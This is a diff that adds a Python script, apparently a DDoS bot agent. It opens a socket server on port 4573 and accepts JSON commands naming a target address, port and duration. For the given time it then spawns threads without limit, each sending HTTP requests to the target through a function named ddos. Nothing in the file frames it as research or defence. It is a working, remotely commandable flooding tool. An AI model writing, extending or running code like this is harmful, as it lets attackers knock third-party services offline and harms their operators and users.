@@ -1,0 +1,54 @@
+import json
+import socket
+import threading
+import time
+import requests
+print(time.time())
+def ddos(address, port):
+        requests.get(f"{address}:{port}", data=0x2FFFFF)
+
+def handle_client(client_socket, address):
+    try:
+        data = client_socket.recv(1024).decode('utf-8')
+        print(f"Received from {address}: {data}")
+        try:
+            json_data = json.loads(data)
+            print(f"Parsed JSON: {json_data}")
+        except json.JSONDecodeError:
+            client_socket.send(b"Invalid JSON")
+        start_time = time.time()
+        while time.time() < (start_time + json_data['time'] + 1):
+            start = threading.Thread(target=ddos,args=(json_data['address'],json_data['port'],))
+            start.start()        
+    except Exception as e:
+        print(f"Error handling client {address}: {e}")
+    finally:
+        client_socket.close()
+
+def run_server(port=4573):
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind(('0.0.0.0', port))
+    server_socket.listen(5)
+    print(f"Starting socket server on port {port}")
+
+    try:
+        while True:
+            client_socket, address = server_socket.accept()
+            print(f"New connection from {address}")
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
+            client_thread.daemon = True
+            client_thread.start()
+    except KeyboardInterrupt:
+        print("Shutting down server")
+        server_socket.close()
+
+server_thread = threading.Thread(target=run_server, args=(4573,))
+server_thread.daemon = True
+server_thread.start()
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("Server stopped")
